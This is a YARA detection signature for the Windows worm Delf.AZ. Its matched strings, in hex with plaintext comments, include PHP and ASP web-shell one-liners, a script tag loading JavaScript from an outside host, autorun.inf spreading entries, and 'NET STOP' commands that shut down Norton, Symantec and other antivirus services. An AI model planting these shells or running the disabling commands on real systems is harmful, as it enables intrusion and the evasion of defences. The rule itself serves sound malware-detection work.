
rule Worm_Win32_Delf_AZ{
	meta:
		description = "Worm:Win32/Delf.AZ,SIGNATURE_TYPE_PEHSTR,ffffff8c 00 ffffff89 00 12 00 00 "
		
	strings :
		$a_01_0 = {53 4f 46 54 57 41 52 45 5c 42 6f 72 6c 61 6e 64 5c 44 65 6c 70 68 69 5c 52 54 4c } //100 SOFTWARE\Borland\Delphi\RTL
		$a_01_1 = {3c 3f 70 68 70 20 40 65 76 61 6c 28 24 5f 50 4f 53 54 5b 6a 6f 6b 65 79 6f 75 70 68 70 5d 29 3f 3e } //10 <?php @eval($_POST[jokeyouphp])?>
		$a_01_2 = {3c 25 65 78 65 63 75 74 65 20 72 65 71 75 65 73 74 28 22 6a 6f 6b 65 79 6f 75 22 29 26 22 22 25 3e } //10 <%execute request("jokeyou")&""%>
		$a_01_3 = {3c 73 63 72 69 70 74 20 6c 61 6e 67 75 61 67 65 3d 22 6a 61 76 61 73 63 72 69 70 74 22 20 73 72 63 3d 22 68 74 74 70 3a 2f 2f 68 74 6d 6c 63 73 73 2e 33 33 32 32 2e 6f 72 67 2f 73 75 62 2f 72 61 79 2e 6a 73 22 3e 3c 2f 73 63 72 69 70 74 3e } //10 <script language="javascript" src="http://htmlcss.3322.org/sub/ray.js"></script>
		$a_01_4 = {3a 5c 61 75 74 6f 72 75 6e 2e 69 6e 66 } //1 :\autorun.inf
		$a_01_5 = {3a 5c 52 45 43 59 43 4c 45 52 2e 65 78 65 } //1 :\RECYCLER.exe
		$a_01_6 = {55 70 64 61 74 65 2e 65 78 65 } //1 Update.exe
		$a_01_7 = {55 70 67 72 61 64 65 2e 65 78 65 } //1 Upgrade.exe
		$a_01_8 = {6f 70 65 6e 3d 52 45 43 59 43 4c 45 52 2e 65 78 65 } //1 open=RECYCLER.exe
		$a_01_9 = {73 68 65 6c 6c 65 78 65 63 75 74 65 3d 52 45 43 59 43 4c 45 52 2e 65 78 65 } //1 shellexecute=RECYCLER.exe
		$a_01_10 = {73 68 65 6c 6c 5c 41 75 74 6f 5c 63 6f 6d 6d 61 6e 64 3d 52 45 43 59 43 4c 45 52 2e 65 78 65 } //1 shell\Auto\command=RECYCLER.exe
		$a_01_11 = {4d 4f 4e 53 59 53 4e 54 2e 45 58 45 } //1 MONSYSNT.EXE
		$a_01_12 = {53 50 49 44 45 52 4e 54 2e 45 58 45 } //1 SPIDERNT.EXE
		$a_01_13 = {49 43 45 53 57 4f 52 44 2e 45 58 45 } //1 ICESWORD.EXE
		$a_01_14 = {4e 45 54 20 53 54 4f 50 20 4f 66 66 69 63 65 53 63 61 6e 4e 54 20 4d 6f 6e 69 74 6f 72 } //1 NET STOP OfficeScanNT Monitor
		$a_01_15 = {4e 45 54 20 53 54 4f 50 20 4e 6f 72 74 6f 6e } //1 NET STOP Norton
		$a_01_16 = {4e 45 54 20 53 54 4f 50 20 5a 6f 6e 65 41 6c 61 72 6d } //1 NET STOP ZoneAlarm
		$a_01_17 = {4e 45 54 20 73 74 6f 70 20 53 79 6d 61 6e 74 65 63 } //1 NET stop Symantec
	condition:
		((#a_01_0  & 1)*100+(#a_01_1  & 1)*10+(#a_01_2  & 1)*10+(#a_01_3  & 1)*10+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1+(#a_01_6  & 1)*1+(#a_01_7  & 1)*1+(#a_01_8  & 1)*1+(#a_01_9  & 1)*1+(#a_01_10  & 1)*1+(#a_01_11  & 1)*1+(#a_01_12  & 1)*1+(#a_01_13  & 1)*1+(#a_01_14  & 1)*1+(#a_01_15  & 1)*1+(#a_01_16  & 1)*1+(#a_01_17  & 1)*1) >=137
 
}